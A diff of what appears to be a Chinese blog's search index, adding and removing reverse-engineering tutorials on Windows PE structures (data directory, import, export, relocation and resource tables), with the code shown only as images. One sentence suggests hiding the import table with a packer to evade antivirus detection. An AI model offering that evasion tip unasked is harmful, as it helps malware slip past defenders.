+<img data-src="/2022/03/25/%E7%9B%AE%E5%BD%95%E8%A1%A8%E7%BB%93%E6%9E%84%E4%B8%8E%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2%E5%87%BD%E6%95%B0/image-20220325092100128.png" class title="image-20220325092100128">
+
+<p>只有两个字段，一个是虚拟地址（数据目录表起始的位置），一个是尺寸（数据目录表结束的位置）</p>
+<p>起始地址+尺寸&#x3D;结束的地址</p>
+<p>vs用宏来定义数据目录结构</p>
+<img data-src="/2022/03/25/%E7%9B%AE%E5%BD%95%E8%A1%A8%E7%BB%93%E6%9E%84%E4%B8%8E%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2%E5%87%BD%E6%95%B0/image-20220325092838107.png" class>
+
+<img data-src="/2022/03/25/%E7%9B%AE%E5%BD%95%E8%A1%A8%E7%BB%93%E6%9E%84%E4%B8%8E%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2%E5%87%BD%E6%95%B0/image-20220325094859726.png" class title="image-20220325094859726">
+
+<p>使用LordPE的模板进行分析</p>
+<p>可以看到上方是DOS头，下方是PE头</p>
+<img data-src="/2022/03/25/%E7%9B%AE%E5%BD%95%E8%A1%A8%E7%BB%93%E6%9E%84%E4%B8%8E%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2%E5%87%BD%E6%95%B0/image-20220327183725633.png" class title="image-20220327183725633">
+
+
+
+<p>先找到NT头（注意下方蓝色部分的变化）</p>
+<img data-src="/2022/03/25/%E7%9B%AE%E5%BD%95%E8%A1%A8%E7%BB%93%E6%9E%84%E4%B8%8E%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2%E5%87%BD%E6%95%B0/image-20220327183905562.png" class title="image-20220327183905562">
+
+
+
+<p>再找到NT头下的扩展头</p>
+<img data-src="/2022/03/25/%E7%9B%AE%E5%BD%95%E8%A1%A8%E7%BB%93%E6%9E%84%E4%B8%8E%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2%E5%87%BD%E6%95%B0/image-20220327184051378.png" class title="image-20220327184051378">
+
+
+
+<p>展开扩展头，最后一项就是数据目录表，展开数据目录表有各个具体的表</p>
+<img data-src="/2022/03/25/%E7%9B%AE%E5%BD%95%E8%A1%A8%E7%BB%93%E6%9E%84%E4%B8%8E%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2%E5%87%BD%E6%95%B0/image-20220327184653232.png" class title="image-20220327184653232">
+
+
+
+<p>随便展开一个数据表里面只有两个字段，一个是虚拟地址，一个是尺寸</p>
+<img data-src="/2022/03/25/%E7%9B%AE%E5%BD%95%E8%A1%A8%E7%BB%93%E6%9E%84%E4%B8%8E%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2%E5%87%BD%E6%95%B0/image-20220327184835573.png" class title="image-20220327184835573">
+
+<h1 id="写一个计算偏移的函数"><a href="#写一个计算偏移的函数" class="headerlink" title="写一个计算偏移的函数"></a>写一个计算偏移的函数</h1><p>先创建一个定义</p>
+<img data-src="/2022/03/25/%E7%9B%AE%E5%BD%95%E8%A1%A8%E7%BB%93%E6%9E%84%E4%B8%8E%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2%E5%87%BD%E6%95%B0/image-20220325095446911.png" class title="image-20220325095446911">
+
+
+
+<p>开始写函数，要从DOS头开始解析，然后解析PE头，区段表，再判断目录表是否落在了头部，或者落在了某个区段内，需要分两种情况，返回的dwRva是不同的，具体的解析可以看下图</p>
+<img data-src="/2022/03/25/%E7%9B%AE%E5%BD%95%E8%A1%A8%E7%BB%93%E6%9E%84%E4%B8%8E%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2%E5%87%BD%E6%95%B0/image-20220325102410695.png" class title="image-20220325102410695">
+
 ]]></content>
       <categories>
         <category>逆向</category>
@@ -713,134 +962,6 @@
       </categories>
       <tags>
         <tag>域渗透</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>导入表结构解析</title>
-    <url>/2022/03/25/%E5%AF%BC%E5%85%A5%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/</url>
-    <content><![CDATA[<h1 id="导入表解析"><a href="#导入表解析" class="headerlink" title="导入表解析"></a>导入表解析</h1><p>导入表是记录PE文件中用到的动态连接库的集合，一个dll库在导入表中占用一个元素信息的位置。而dll作为一个元素有很多信息如时间、序号、加载后的函数地址等。这些信息存在IMAGE_IMPORT_DESCRIPTOR结构体中，一个dll就是一个这样的结构体。导入表就是这些dll的集合，有点像元素（每个dll）与数组（导入表）的关系。</p>
-<p>使用LordPE先查看导入表的一些基本信息，可以看到每一个动态链接库都调用了很多api。</p>
-<img data-src="/2022/03/25/%E5%AF%BC%E5%85%A5%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220325162801268.png" class title="image-20220325162801268">
-
-
-
-<p>查看三个与导入表相关的结构（图片里面的注释时该字段的说明）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IMAGE_IMPORT_DESCRIPTOR</span><br><span class="line">IMAGE_THUNK_DATA</span><br><span class="line">IMAGE_IMPORT_BY_NAME</span><br></pre></td></tr></table></figure>
-
-<p>三个结构体调用的先后关系</p>
-<img data-src="/2022/03/25/%E5%AF%BC%E5%85%A5%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220327225843055.png" class title="image-20220327225843055">
-
-<img data-src="/2022/03/25/%E5%AF%BC%E5%85%A5%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220325163835784.png" class title="image-20220325163835784">
-
-
-
-<h2 id="1、IMAGE-IMPORT-DESCRIPTOR解析"><a href="#1、IMAGE-IMPORT-DESCRIPTOR解析" class="headerlink" title="1、IMAGE_IMPORT_DESCRIPTOR解析"></a>1、IMAGE_IMPORT_DESCRIPTOR解析</h2><p>a、如果Characteristics的值为0，说明这是导入表结构体数组的最后一个元素，也就是导入表这个数组存放的最后一个dll。如果Characteristics的值不为0，用OriginalFirstThunk（RVA）来索引INT的地址。这张INT表存放了该dll的导出函数信息（序号与函数名）。</p>
-<p>b、当TimeDateStamp&#x3D;0时，表示未加载前IAT表与INT表完全相同；当TimeDateStamp&#x3D;-1时，表示IAT表与INT表不同，IAT表存该dll所有函数的绝对地址，当TimeDateStamp&#x3D;-1时绑定导入表才有效。</p>
-<p>c、name字段时RVA指向dll的名字</p>
-<p>d、FirstThunk，RVA指向IAT表</p>
-<img data-src="/2022/03/25/%E5%AF%BC%E5%85%A5%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220325170815048.png" class title="image-20220325170815048">
-
-<h2 id="2、IAT（Import-Address-Table）和INT（Import-Name-Table）结构解析"><a href="#2、IAT（Import-Address-Table）和INT（Import-Name-Table）结构解析" class="headerlink" title="2、IAT（Import Address Table）和INT（Import Name Table）结构解析"></a>2、IAT（Import Address Table）和INT（Import Name Table）结构解析</h2><p>当加载到内存前IAT和INT结构是相同的，都指向一个结构体，也就是IMAGE_IMPORT_BY_NAME，存储着需要导入的函数的序号和名称。IAT和INT的元素为IMAGE_THUNK_DATA，它的最后一个字段由四字节的AddressOfData指向IMAGE_IMPORT_BY_NAME结构体。这就是加载到内存前，IAT和INT的结构，其实是一样的。</p>
-<p>当加载到内存后，INT依旧保存dll的函数名与函数序号的地址。但是此时IAT则根据导入表的INT（IAT加载前）的内容和导出表信息，修改为对应的函数的地址信息。如下图</p>
-<img data-src="/2022/03/25/%E5%AF%BC%E5%85%A5%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220328085822090.png" class title="image-20220328085822090">
-
-<h2 id="3、绑定导入表与IAT"><a href="#3、绑定导入表与IAT" class="headerlink" title="3、绑定导入表与IAT"></a>3、绑定导入表与IAT</h2><p>上面的情况都是IAT存储着非函数地址的情况，但是有些时候加载前IAT表是要存储函数地址的。IAT存储的函数地址是dll未加载的地址。当PE文件中不存在绑定导入表时，IAT就和INT一样，此时导入表中的时间戳为0。当导入表的时间戳为-1时，IAT表就存储该dll的所有函数的绝对地址，dll的真正时间戳会存放于绑定导入表中（绑定导入表地址存放在数据目录的第12项，IAT是第13项）。</p>
-<p>PE中包含导入表的优点是程序启动快，但是其缺点也十分明显，当存在dll地址重定位和dll修改更新，则绑定导入表也需要修改更新。</p>
-<p>查看与绑定导入表相关的两个结构体</p>
-<img data-src="/2022/03/25/%E5%AF%BC%E5%85%A5%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220328091610745.png" class title="image-20220328091610745">
-
-<p>PS：这两个结构体中所有的OffsetModuleName均不是相对于ImageBase的RVA也不是FOA，而是相对于绑定导入表首地址的偏移地址，即：<strong>绑定导入表首地址 + OffsetModuleName&#x3D; RVA</strong>。</p>
-<p>图解如下</p>
-<img data-src="/2022/03/25/%E5%AF%BC%E5%85%A5%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220328091717637.png" class title="image-20220328091717637">
-
-<p>引用了csdn的Apollon_krj师傅的结构解析图。</p>
-<h1 id="代码解析"><a href="#代码解析" class="headerlink" title="代码解析"></a>代码解析</h1><p>结构理清楚过后就写代码来解析</p>
-<img data-src="/2022/03/25/%E5%AF%BC%E5%85%A5%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220325180456376.png" class title="image-20220325180456376">
-
-<p>这里还要在主函数之中调用一下</p>
-<img data-src="/2022/03/25/%E5%AF%BC%E5%85%A5%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220325180527792.png" class title="image-20220325180527792">
-
-
-
-<p>可以看到返回了我们想要的结果，把导入表进行了遍历</p>
-<img data-src="/2022/03/25/%E5%AF%BC%E5%85%A5%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220325180651925.png" class title="image-20220325180651925">
-
-
-
-<p>导入表的上半部分导入表的相关信息已经解析成功了，现在解析下半部分的api函数部分</p>
-<img data-src="/2022/03/25/%E5%AF%BC%E5%85%A5%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220325180821535.png" class title="image-20220325180821535">
-
-
-
-<p>还是通过写函数来解析</p>
-<img data-src="/2022/03/25/%E5%AF%BC%E5%85%A5%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220325183239217.png" class title="image-20220325183239217">
-
-<img data-src="/2022/03/25/%E5%AF%BC%E5%85%A5%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220325183508506.png" class title="image-20220325183508506">
-
-<p>可以看到是成功解析了的，并且顺序也没有问题，这就是一个基本的导入表的分析</p>
-<p>总结：导入表的大小主要取决于写代码的时候导入了多少动态链接库，就会在导入表这里显示导入了多少动态链接库，导入了多少函数。如果正常程序调用了太多dll可能会引起误报，所以做免杀的时候可以将导入表不显示。例如可以写壳等方式。</p>
-<p>参考：<a href="https://blog.csdn.net/Apollon_krj/article/details/77417063?spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1.pc_relevant_paycolumn_v3&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1.pc_relevant_paycolumn_v3&amp;utm_relevant_index=2">https://blog.csdn.net/Apollon_krj/article/details/77417063?spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1.pc_relevant_paycolumn_v3&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1.pc_relevant_paycolumn_v3&amp;utm_relevant_index=2</a></p>
-]]></content>
-      <categories>
-        <category>逆向</category>
-      </categories>
-      <tags>
-        <tag>PE</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>导出表结构解析</title>
-    <url>/2022/03/26/%E5%AF%BC%E5%87%BA%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/</url>
-    <content><![CDATA[<h1 id="导出表结构解析"><a href="#导出表结构解析" class="headerlink" title="导出表结构解析"></a>导出表结构解析</h1><h2 id="什么是导出表"><a href="#什么是导出表" class="headerlink" title="什么是导出表"></a>什么是导出表</h2><p>一个程序引用哪些模块是由导入表决定的，与导入表对应的就是导出表，导出表则是决定当前的PE文件能够给其它PE文件提供的函数。正常情况下，只有dll动态链接库才有导出表，这里用dll文件来做实验</p>
-<p>使用010Editor查看导出表</p>
-<img data-src="/2022/03/26/%E5%AF%BC%E5%87%BA%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220326140512674.png" class title="image-20220326140512674">
-
-<p>在PE的NT头下的扩展头下的DataDirArray[0]表达的是导出表的位置和大小</p>
-<img data-src="/2022/03/26/%E5%AF%BC%E5%87%BA%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220328094315573.png" class title="image-20220328094315573">
-
-<p>可以看到VitualAddress和Size都是DWORD类型，但是这里知识导出表的起始地址(RVA)，在010editor直接Ctrl+G搜索，F1950</p>
-<img data-src="/2022/03/26/%E5%AF%BC%E5%87%BA%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220328094840802.png" class title="image-20220328094840802">
-
-
-
-<h2 id="代码解析导出表"><a href="#代码解析导出表" class="headerlink" title="代码解析导出表"></a>代码解析导出表</h2><p>导出表的基本结构，进入导出表</p>
-<img data-src="/2022/03/26/%E5%AF%BC%E5%87%BA%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220326140711566.png" class title="image-20220326140711566">
-
-<p>相关的参数如图中的注释</p>
-<img data-src="/2022/03/26/%E5%AF%BC%E5%87%BA%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220326141430682.png" class title="image-20220326141430682">
-
-
-
-<p>写函数解析导出表上半部分的结构</p>
-<img data-src="/2022/03/26/%E5%AF%BC%E5%87%BA%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220326144108918.png" class title="image-20220326144108918">
-
-<p>在LordPE中这就是红线框起来的部分</p>
-<img data-src="/2022/03/26/%E5%AF%BC%E5%87%BA%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220326144155090.png" class title="image-20220326144155090">
-
-<p>还需要把下面的函数名以及RVA等打印出来</p>
-<p>后面三个属性需要是RVA需要转换</p>
-<img data-src="/2022/03/26/%E5%AF%BC%E5%87%BA%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220326150854304.png" class title="image-20220326150854304">
-
-<p>执行后成功返回我们需要的信息</p>
-<img data-src="/2022/03/26/%E5%AF%BC%E5%87%BA%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220326151530348.png" class title="image-20220326151530348">
-
-
-
-<p>重点理解一下最后三个RVA（AddressOfFunctions，AddressOfNames，AddressOfNameOrdinals）</p>
-<p>AddressOfFunctions：一个RVA，指向一个DWORD数组，数组中的每一项是一个导出函数的RVA，顺序与导出序号相同。</p>
-<p>AddressOfNames：一个RVA，依然指向一个DWORD数组，数组中的每一项仍然是一个RVA，指向一个表示函数名字。</p>
-<p>AddressOfNameOrdinals：一个RVA，还是指向一个WORD数组，数组中的每一项与AddressOfNames中的每一项对应，表示该名字的函数在AddressOfFunctions中的序号。</p>
-<img data-src="/2022/03/26/%E5%AF%BC%E5%87%BA%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220326153512424.png" class title="image-20220326153512424">
-
-
-
-<p>参考：<a href="https://blog.csdn.net/evileagle/article/details/12176797">https://blog.csdn.net/evileagle/article/details/12176797</a></p>
-]]></content>
-      <categories>
-        <category>逆向</category>
-      </categories>
-      <tags>
-        <tag>PE</tag>
       </tags>
   </entry>
   <entry>
@@ -1217,54 +1338,98 @@
       </tags>
   </entry>
   <entry>
-    <title>目录表结构与地址转换函数</title>
-    <url>/2022/03/25/%E7%9B%AE%E5%BD%95%E8%A1%A8%E7%BB%93%E6%9E%84%E4%B8%8E%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2%E5%87%BD%E6%95%B0/</url>
-    <content><![CDATA[<h1 id="数据目录表结构"><a href="#数据目录表结构" class="headerlink" title="数据目录表结构"></a>数据目录表结构</h1><p>先用LordPE看看基本的目录结构</p>
-<img data-src="/2022/03/25/%E7%9B%AE%E5%BD%95%E8%A1%A8%E7%BB%93%E6%9E%84%E4%B8%8E%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2%E5%87%BD%E6%95%B0/image-20220325091841547.png" class title="image-20220325091841547">
+    <title>重定位表结构解析</title>
+    <url>/2022/03/27/%E9%87%8D%E5%AE%9A%E4%BD%8D%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/</url>
+    <content><![CDATA[<h1 id="重定位表的作用"><a href="#重定位表的作用" class="headerlink" title="重定位表的作用"></a>重定位表的作用</h1><p>重定位表用于在程序加载到内存中时，进行内存地址的修正。如果一个exe需要三个动态链接库dll（a.dll，b.dll，c.dll），假设这个exe的ImageBase为400000H，而a.dll、b.dll、c.dll的基址ImageBase均为1000000H。<br>那么操作系统的加载程序在将exe加载进内存时，直接复制其程序到400000H开始的虚拟内存中，接着一一加载a.dll、b.dll、c.dll：假设先加载a.dll，如果exe的ImageBase + SizeOfImage + 1000H不大于1000000H，则a.dll直接复制到1000000H开始的内存中；当b.dll加载时，虽然其基址也为1000000H，但是由于1000000H已经被a.dll占用，则b.dll需要重新分配基址，比如加载程序经过计算将其分配到1200000H的地址，c.dll同样经过计算将其加载到150000H的地址。如下图所示：</p>
+<img data-src="/2022/03/27/%E9%87%8D%E5%AE%9A%E4%BD%8D%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220328095543424.png" class title="image-20220328095543424">
+
+<p>当加载器加载程序时，如果加载器为某PE（.exe、.dll）分配的基址与其自身默认记录的ImageBase不相同，那么该程序文件加载完毕后就需要修正重定位表中的所有需要修正的地址。如果加载器分配的基址和该程序文件中记录默认的ImageBase相同，则不需要修正，重定位表对于该dll也是没有效用的。</p>
+<h1 id="查看基本的结构"><a href="#查看基本的结构" class="headerlink" title="查看基本的结构"></a>查看基本的结构</h1><p>重定位的结构在IMAGE_BASE_RELOCATION当中</p>
+<img data-src="/2022/03/27/%E9%87%8D%E5%AE%9A%E4%BD%8D%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220327105514756.png" class title="image-20220327105514756">
 
 
 
-<p>用vs查看目录结构具体有哪些参数</p>
-<img data-src="/2022/03/25/%E7%9B%AE%E5%BD%95%E8%A1%A8%E7%BB%93%E6%9E%84%E4%B8%8E%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2%E5%87%BD%E6%95%B0/image-20220325092100128.png" class title="image-20220325092100128">
+<p>结构十分简单，一共只有三个字段</p>
+<img data-src="/2022/03/27/%E9%87%8D%E5%AE%9A%E4%BD%8D%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220327105843085.png" class title="image-20220327105843085">
 
-<p>只有两个字段，一个是虚拟地址（数据目录表起始的位置），一个是尺寸（数据目录表结束的位置）</p>
-<p>起始地址+尺寸&#x3D;结束的地址</p>
-<p>vs用宏来定义数据目录结构</p>
-<img data-src="/2022/03/25/%E7%9B%AE%E5%BD%95%E8%A1%A8%E7%BB%93%E6%9E%84%E4%B8%8E%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2%E5%87%BD%E6%95%B0/image-20220325092838107.png" class>
-
-<img data-src="/2022/03/25/%E7%9B%AE%E5%BD%95%E8%A1%A8%E7%BB%93%E6%9E%84%E4%B8%8E%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2%E5%87%BD%E6%95%B0/image-20220325094859726.png" class title="image-20220325094859726">
-
-<p>使用LordPE的模板进行分析</p>
-<p>可以看到上方是DOS头，下方是PE头</p>
-<img data-src="/2022/03/25/%E7%9B%AE%E5%BD%95%E8%A1%A8%E7%BB%93%E6%9E%84%E4%B8%8E%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2%E5%87%BD%E6%95%B0/image-20220327183725633.png" class title="image-20220327183725633">
+<p>在LordPE中有区段，RVA等信息，使用函数打印出来</p>
+<img data-src="/2022/03/27/%E9%87%8D%E5%AE%9A%E4%BD%8D%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220327111757560.png" class title="image-20220327111757560">
 
 
 
-<p>先找到NT头（注意下方蓝色部分的变化）</p>
-<img data-src="/2022/03/25/%E7%9B%AE%E5%BD%95%E8%A1%A8%E7%BB%93%E6%9E%84%E4%B8%8E%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2%E5%87%BD%E6%95%B0/image-20220327183905562.png" class title="image-20220327183905562">
+<p>具体的函数</p>
+<img data-src="/2022/03/27/%E9%87%8D%E5%AE%9A%E4%BD%8D%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220327113624209.png" class title="image-20220327113624209">
 
 
 
-<p>再找到NT头下的扩展头</p>
-<img data-src="/2022/03/25/%E7%9B%AE%E5%BD%95%E8%A1%A8%E7%BB%93%E6%9E%84%E4%B8%8E%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2%E5%87%BD%E6%95%B0/image-20220327184051378.png" class title="image-20220327184051378">
+<p>查看运行结果</p>
+<img data-src="/2022/03/27/%E9%87%8D%E5%AE%9A%E4%BD%8D%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220327114233192.png" class title="image-20220327114233192">
+]]></content>
+      <categories>
+        <category>逆向</category>
+      </categories>
+      <tags>
+        <tag>PE</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>资源表结构解析</title>
+    <url>/2022/03/31/%E8%B5%84%E6%BA%90%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/</url>
+    <content><![CDATA[<h1 id="资源表和其他数据表展示"><a href="#资源表和其他数据表展示" class="headerlink" title="资源表和其他数据表展示"></a>资源表和其他数据表展示</h1><p>windows的可执行程序将程序的各种界面定义为资源，比如光标，对话框，图标，菜单，串表，工具栏，版本信息等等</p>
+<p>还是先用LordPE看看资源表有哪些具体东西</p>
+<img data-src="/2022/03/31/%E8%B5%84%E6%BA%90%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220331092307699.png" class title="image-20220331092307699">
+
+<p>从图中大概可以看到，一个程序有很多资源，这些资源项用不同的ID或者名称来区分。但是要将这么多种类型的不同ID的资源有序的组织起来是很繁琐的事情，因此在PE中我们采取类似于磁盘目录结构的方式保存。在PE文件中的资源是按照 资源类型 -&gt; 资源ID -&gt; 资源代码页的3层树型目录结构来组织资源的，通过层层索引才能够进入相应的子目录找到正确的资源。</p>
+<h1 id="资源目录结构"><a href="#资源目录结构" class="headerlink" title="资源目录结构"></a>资源目录结构</h1><p>数据目录表中的 IMAGE_DIRECTORY_ENTRY_RESOURCE 条目包含资源的 RVA 和大小。</p>
+<img data-src="/2022/03/31/%E8%B5%84%E6%BA%90%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220331092816243.png" class title="image-20220331092816243">
+
+<img data-src="/2022/03/31/%E8%B5%84%E6%BA%90%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220331093045452.png" class title="image-20220331093045452">
+
+<p>资源目录结构中的每一个节点都是由 IMAGE_RESOURCE_DIRECTORY 结构和紧跟其后的数个IMAGE_RESOURCE_DIRECTORY_ENTRY 结构组成的。知道了这样的嵌套关系过后，我们先来看一看 IMAGE_RESOURCE_DIRECTORY 这个结构。里边有用的只有后两项表示在这个 IMAGE_RESOURCE_DIRCTORY ，后边紧跟的 IMAGE_RESOURCE_DIR_ENTRY 数量</p>
+<img data-src="/2022/03/31/%E8%B5%84%E6%BA%90%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220331093827786.png" class title="image-20220331093827786">
+
+<p>那什么是字符串什么是数字呢</p>
+<img data-src="/2022/03/31/%E8%B5%84%E6%BA%90%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220331093935784.png" class title="image-20220331093935784">
+
+<p>图中箭头指向的就是字符串，这些字符串有多少个NumberOfNamedEntries的值就为多少，比如这里就是4（Icon，Menu，Group Icon，Version Information）。而数字作为标识的有多少个NumberOfIdEntries的值就为多少，比如这里就是1（24）。</p>
+<p>现在来看下一个结构_IMAGE_RESOURCE_DIRECTORY_ENTRY，IMAGE_RESOURCE_DIRECTORY_ENTRY 紧跟在资源目录结构后。</p>
+<img data-src="/2022/03/31/%E8%B5%84%E6%BA%90%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220331094939229.png" class title="image-20220331094939229">
 
 
 
-<p>展开扩展头，最后一项就是数据目录表，展开数据目录表有各个具体的表</p>
-<img data-src="/2022/03/25/%E7%9B%AE%E5%BD%95%E8%A1%A8%E7%BB%93%E6%9E%84%E4%B8%8E%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2%E5%87%BD%E6%95%B0/image-20220327184653232.png" class title="image-20220327184653232">
+<p>当NameISString是1的时候nameoffset就起作用了，这时候指向的是这个IMAGE_RESOURCE_DIR_STRING_U结构</p>
+<p>看看这个IMAGE_RESOURCE_DIR_STRING_U结构</p>
+<img data-src="/2022/03/31/%E8%B5%84%E6%BA%90%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220331095238549.png" class title="image-20220331095238549">
 
 
 
-<p>随便展开一个数据表里面只有两个字段，一个是虚拟地址，一个是尺寸</p>
-<img data-src="/2022/03/25/%E7%9B%AE%E5%BD%95%E8%A1%A8%E7%BB%93%E6%9E%84%E4%B8%8E%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2%E5%87%BD%E6%95%B0/image-20220327184835573.png" class title="image-20220327184835573">
-
-<h1 id="写一个计算偏移的函数"><a href="#写一个计算偏移的函数" class="headerlink" title="写一个计算偏移的函数"></a>写一个计算偏移的函数</h1><p>先创建一个定义</p>
-<img data-src="/2022/03/25/%E7%9B%AE%E5%BD%95%E8%A1%A8%E7%BB%93%E6%9E%84%E4%B8%8E%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2%E5%87%BD%E6%95%B0/image-20220325095446911.png" class title="image-20220325095446911">
+<p>还有最后一个结构_IMAGE_RESOURCE_DATA_ENTRY，这个结构体是用来表示资源数据的信息，前两个有用其他的没有用。</p>
+<img data-src="/2022/03/31/%E8%B5%84%E6%BA%90%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220331100533366.png" class title="image-20220331100533366">
 
 
 
-<p>开始写函数，要从DOS头开始解析，然后解析PE头，区段表，再判断目录表是否落在了头部，或者落在了某个区段内，需要分两种情况，返回的dwRva是不同的，具体的解析可以看下图</p>
-<img data-src="/2022/03/25/%E7%9B%AE%E5%BD%95%E8%A1%A8%E7%BB%93%E6%9E%84%E4%B8%8E%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2%E5%87%BD%E6%95%B0/image-20220325102410695.png" class title="image-20220325102410695">
+<h1 id="代码解析资源表"><a href="#代码解析资源表" class="headerlink" title="代码解析资源表"></a>代码解析资源表</h1><img data-src="/2022/03/31/%E8%B5%84%E6%BA%90%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220331145747992.png" class title="image-20220331145747992">
+
+<img data-src="/2022/03/31/%E8%B5%84%E6%BA%90%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220331145801895.png" class title="image-20220331145801895">
+
+<img data-src="/2022/03/31/%E8%B5%84%E6%BA%90%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220331145819925.png" class title="image-20220331145819925">
+
+<img data-src="/2022/03/31/%E8%B5%84%E6%BA%90%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220331145836585.png" class title="image-20220331145836585">
+
+<p>这是显示结果</p>
+<img data-src="/2022/03/31/%E8%B5%84%E6%BA%90%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220331160506934.png" class title="image-20220331160506934">
+
+
+
+<h1 id="其他的数据表"><a href="#其他的数据表" class="headerlink" title="其他的数据表"></a>其他的数据表</h1><p>还有一些表是没什么意义的，但是可以打印RVA和长度</p>
+<img data-src="/2022/03/31/%E8%B5%84%E6%BA%90%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220331154858673.png" class title="image-20220331154858673">
+
+
+
+<p>数据目录表中有哪一个没解析的，就用哪个就可以了，比如打印DEBUG表</p>
+<img data-src="/2022/03/31/%E8%B5%84%E6%BA%90%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220331155424798.png" class title="image-20220331155424798">
+
